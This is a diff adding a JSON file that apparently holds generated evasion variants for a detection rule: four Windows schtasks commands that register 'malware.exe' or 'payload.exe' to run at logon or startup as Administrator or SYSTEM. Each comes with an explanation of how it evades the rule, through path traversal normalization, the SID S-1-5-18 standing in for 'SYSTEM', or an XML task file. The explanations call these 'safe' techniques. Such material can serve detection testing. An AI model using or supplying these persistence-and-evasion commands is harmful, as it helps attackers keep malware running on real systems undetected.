@@ -1,0 +1,18 @@
+[
+  {
+    "output": "schtasks.exe /Create /SC ONLOGON /RU \"Administrator\" /TR \"C:\\Users\\Public\\\\..\\Admin\\AppData\\Local\\malware.exe\"",
+    "explanation": "This command uses path normalization (C:\\Users\\Public\\\\..\\Admin\\AppData\\Local) to reach the AppData\\Local folder, which is a safe mutation technique. It also uses quotes to encapsulate the TR parameter, which is a common and safe insertion technique."
+  },
+  {
+    "output": "cmd.exe /c \"cd C:\\Users\\Public\\..\\Admin\\AppData\\Local && schtasks /Create /TN \"UpdateTask\" /TR \"payload.exe\" /SC ONSTART /RU SYSTEM\"",
+    "explanation": "This command uses path normalization (C:\\Users\\Public\\..\\Admin\\AppData\\Local) and command chaining to reach the target directory. It also uses quotes and spaces to encapsulate the command, which are safe insertion techniques."
+  },
+  {
+    "output": "schtasks /Create /TN \"UpdateTask\" /TR \"payload.exe\" /SC ONSTART /RU S-1-5-18",
+    "explanation": "This command uses the security identifier (S-1-5-18) instead of the string 'SYSTEM', which is a substitution technique. It is functionally equivalent and avoids the keyword 'SYSTEM' that the rule is filtering on."
+  },
+  {
+    "output": "schtasks /create /tn \"UpdateTask\" /xml C:\\Windows\\Temp\\task_config.xml",
+    "explanation": "This command uses the /xml option to create a task from an XML file, which does not include the AppData\\Local path in the command line. This is a safe omission technique as it avoids the pattern the rule is looking for."
+  }
+]
